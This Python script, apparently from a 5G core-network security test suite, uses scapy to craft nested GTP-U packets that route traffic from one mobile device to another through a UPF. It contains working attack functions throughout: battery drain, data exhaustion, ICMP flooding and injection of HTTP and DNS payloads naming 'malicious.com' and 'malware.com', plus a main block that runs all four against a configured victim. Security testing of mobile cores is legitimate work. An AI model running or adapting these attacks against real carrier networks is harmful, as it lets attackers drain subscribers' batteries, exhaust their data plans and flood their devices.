#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.layers.inet import IP, UDP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.contrib.gtp import GTPHeader
import logging
import time
from core.config import TEST_CONFIG, validate_config
 
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def craft_ue_to_ue_tunnel(upf_ip, source_ue_ip, source_teid, target_ue_ip, target_teid, payload):
    try:
        inner_pkt = IP(src=source_ue_ip, dst=target_ue_ip)/UDP(sport=5000, dport=5000)/Raw(load=payload)
        
        inner_gtpu = GTPHeader(teid=target_teid, gtp_type=255)/inner_pkt
        
        outer_packet = IP(src=source_ue_ip, dst=upf_ip)/UDP(sport=2152, dport=2152)/GTPHeader(teid=source_teid, gtp_type=255)/Raw(load=bytes(inner_gtpu))
        
        return outer_packet
    except Exception as e:
        logger.error(f"Failed to craft UE-to-UE tunnel: {e}")
        return None

def battery_drain_attack(upf_ip, attacker_ue_ip, attacker_teid, victim_ue_ip, victim_teid, duration=10, rate=10, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"Battery drain attack: {attacker_ue_ip} -> {victim_ue_ip}")
    logger.info(f"Duration: {duration}s, Rate: {rate} pps")
    
    packets_sent = 0
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            junk_payload = b'\x00' * 512
            
            tunnel_pkt = craft_ue_to_ue_tunnel(
                upf_ip, attacker_ue_ip, attacker_teid,
                victim_ue_ip, victim_teid, junk_payload
            )
            
            if tunnel_pkt:
                send(tunnel_pkt, iface=iface, verbose=0)
                packets_sent += 1
            
            time.sleep(1.0 / rate)
        
        logger.info(f"✓ Battery drain complete: {packets_sent} packets sent")
        return packets_sent
    except Exception as e:
        logger.error(f"Battery drain attack failed: {e}")
        return packets_sent

def data_exhaustion_attack(upf_ip, attacker_ue_ip, attacker_teid, victim_ue_ip, victim_teid, data_mb=10, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"Data exhaustion attack: targeting {data_mb}MB to {victim_ue_ip}")
    
    chunk_size = 1024 * 10
    chunks_needed = (data_mb * 1024 * 1024) // chunk_size
    
    packets_sent = 0
    
    try:
        for i in range(chunks_needed):
            payload = b'\x00' * chunk_size
            
            tunnel_pkt = craft_ue_to_ue_tunnel(
                upf_ip, attacker_ue_ip, attacker_teid,
                victim_ue_ip, victim_teid, payload
            )
            
            if tunnel_pkt:
                send(tunnel_pkt, iface=iface, verbose=0)
                packets_sent += 1
            
            if i % 100 == 0:
                logger.debug(f"Progress: {(i * chunk_size) / (1024 * 1024):.2f}MB sent")
        
        logger.info(f"✓ Data exhaustion complete: {packets_sent} packets ({data_mb}MB)")
        return packets_sent
    except Exception as e:
        logger.error(f"Data exhaustion attack failed: {e}")
        return packets_sent

def icmp_flood_ue(upf_ip, attacker_ue_ip, attacker_teid, victim_ue_ip, victim_teid, count=100, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"ICMP flood: {count} packets to {victim_ue_ip}")
    
    packets_sent = 0
    
    try:
        for _ in range(count):
            icmp_payload = IP(src=attacker_ue_ip, dst=victim_ue_ip)/ICMP()/Raw(load=b'X'*56)
            
            tunnel_pkt = craft_ue_to_ue_tunnel(
                upf_ip, attacker_ue_ip, attacker_teid,
                victim_ue_ip, victim_teid, bytes(icmp_payload)
            )
            
            if tunnel_pkt:
                send(tunnel_pkt, iface=iface, verbose=0)
                packets_sent += 1
        
        logger.info(f"✓ ICMP flood complete: {packets_sent}/{count} packets sent")
        return packets_sent
    except Exception as e:
        logger.error(f"ICMP flood failed: {e}")
        return packets_sent

def malicious_payload_injection(upf_ip, attacker_ue_ip, attacker_teid, victim_ue_ip, victim_teid, payload_type="http", iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"Malicious payload injection ({payload_type}) to {victim_ue_ip}")
    
    if payload_type == "http":
        payload = b"GET / HTTP/1.1\r\nHost: malicious.com\r\n\r\n"
    elif payload_type == "dns":
        payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07malware\x03com\x00\x00\x01\x00\x01'
    elif payload_type == "custom":
        payload = b'\x41' * 1024
    else:
        payload = b'MALICIOUS_PAYLOAD'
    
    try:
        tunnel_pkt = craft_ue_to_ue_tunnel(
            upf_ip, attacker_ue_ip, attacker_teid,
            victim_ue_ip, victim_teid, payload
        )
        
        if tunnel_pkt:
            send(tunnel_pkt, iface=iface, verbose=0)
            logger.info(f"✓ Malicious payload sent ({len(payload)} bytes)")
            return True
        else:
            logger.error("Failed to craft payload packet")
            return False
    except Exception as e:
        logger.error(f"Payload injection failed: {e}")
        return False

if __name__ == "__main__":
    upf_ip = TEST_CONFIG["upf_ip"]
    attacker_ip = TEST_CONFIG["outer_src"]
    attacker_teid = TEST_CONFIG["outer_teid"]
    victim_ip = TEST_CONFIG["victim_ip"]
    victim_teid = TEST_CONFIG["victim_teid"]
    
    logger.info("=== UE-to-UE Injection Attack Suite ===\n")
    
    logger.info("Test 1: Battery Drain (5s)")
    battery_drain_attack(upf_ip, attacker_ip, attacker_teid, victim_ip, victim_teid, duration=5, rate=5)
    
    logger.info("\nTest 2: Data Exhaustion (1MB)")
    data_exhaustion_attack(upf_ip, attacker_ip, attacker_teid, victim_ip, victim_teid, data_mb=1)
    
    logger.info("\nTest 3: ICMP Flood (10 packets)")
    icmp_flood_ue(upf_ip, attacker_ip, attacker_teid, victim_ip, victim_teid, count=10)
    
    logger.info("\nTest 4: Malicious HTTP Injection")
    malicious_payload_injection(upf_ip, attacker_ip, attacker_teid, victim_ip, victim_teid, payload_type="http")

